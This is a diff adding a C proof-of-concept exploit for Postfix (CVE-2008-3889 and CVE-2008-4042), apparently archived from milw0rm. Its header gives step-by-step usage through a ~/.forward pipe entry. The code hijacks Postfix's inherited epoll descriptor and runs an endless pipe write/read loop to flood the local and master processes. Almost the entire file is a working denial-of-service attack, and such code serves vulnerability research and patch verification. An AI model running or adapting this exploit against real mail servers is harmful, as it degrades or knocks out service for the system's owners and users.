@@ -1,0 +1,116 @@
+/*
+ * http://www.wekk.net/research/CVE-2008-4042/CVE-2008-4042-exploit.c
+ * http://www.wekk.net/research/CVE-2008-3889/CVE-2008-3889-exploit.c
+ *
+ * Exploit for Postfix 2.4 before 2.4.9, 2.5 before 2.5.5, and 2.6 
+ * before 2.6-20080902, when used with the Linux 2.6 kernel.
+ *
+ * CVE-2008-3889 & CVE-2008-4042
+ *
+ * by Albert Sellarès <whats[at]wekk[dot]net> - http://www.wekk.net
+ * and Marc Morata Fité <marc.morata.fite[at]gmail[dot]com> 
+ * 2008-09-16
+ *
+ * This Proof of concept creates a pipe and adds it in the postfix's epoll 
+ * file descriptor.
+ * When the pipe is added, an endless loop will launch lots of events to the 
+ * local and master postfix processes. 
+ * This will slowdown de system a lot.
+ *
+ * An example of use:
+ * 1- Put the content "| ~/CVE-2008-3889-exploit >> /tmp/postfix.log &" (with 
+ * the double quotes) 
+ * in the file ~/.forward
+ *
+ * 2- Put the CVE-2008-4042-exploit in your home
+ * gcc CVE-2008-3889-exploit.c -o CVE-2008-3889-exploit
+ *
+ * 3- Send and email to the user
+ *
+ * You can see the output at /tmp/postfix.log
+ */
+
+
+#include <sys/epoll.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <dirent.h>
+#include <errno.h>
+
+#define FDOPEN 200
+
+
+void add_fd(int fde, int fd) {
+	printf("[*] Adding fd %d to eventpoll %d\n", fd, fde);
+	static struct epoll_event ev;
+	ev.events = EPOLLIN|EPOLLOUT|EPOLLPRI|EPOLLERR|EPOLLHUP|EPOLLET;
+	errno =0;
+	// If this is a socket fd, the load is high
+	ev.data.u32 = 6;
+	ev.data.u64 = 6;
+
+	if (epoll_ctl(fde, EPOLL_CTL_ADD, fd, &ev) == 0) {
+		printf(" => Fd %d added!\n", fd);
+	} else {
+		printf(" => Error (%d) adding fd %d\n", errno, fd);
+	}
+}
+
+int main(int argc, char *argv[]) {
+
+	int fds[2];
+	char dir[32], c;
+	int i, found = 0;
+
+	pipe(fds);
+	sprintf(dir, "/proc/%d/fd", getpid());
+	printf("[*] Opening directory %s\n", dir);
+	DIR *fd_dir = opendir(dir);
+	struct dirent *de = readdir(fd_dir);
+
+	// We are looking for the eventpoll file descriptor
+	while (de != NULL) {
+		char link_d[256];
+		char link_f[256];
+		memset(link_d, 0, 256);
+		sprintf(link_f, "%s/%s", dir, de->d_name);
+		readlink(link_f, link_d, 256);
+		if ( strstr(link_d, "eventpoll") ) {
+			found = 1;
+			printf(" => %s points to %s\n", de->d_name, link_d);
+			add_fd(atoi(de->d_name), fds[0]);
+			// We can test with more than one triggered event at once
+			for (i = 0; i<FDOPEN; i++)
+				add_fd(atoi(de->d_name),dup(fds[0]));
+		}
+		de = readdir(fd_dir);
+	}
+	closedir(fd_dir);
+	
+	if (found == 0) {
+		printf("[!] Are you sure that your postfix is vulnerable?\n");
+		printf("[!] Are you launching me throw a .forward file?\n");
+		exit(0);
+	}
+	
+	printf("[*] Starting to flood the system!\n");
+	fflush(stdout);
+	close(0);
+	close(1);
+	close(2);
+
+	// This triggers the events
+	while (1) {
+		write(fds[1], "A",1);
+		read(fds[0],&c, 1);
+	}
+
+	return 0;
+}
+
+// milw0rm.com [2008-09-16]
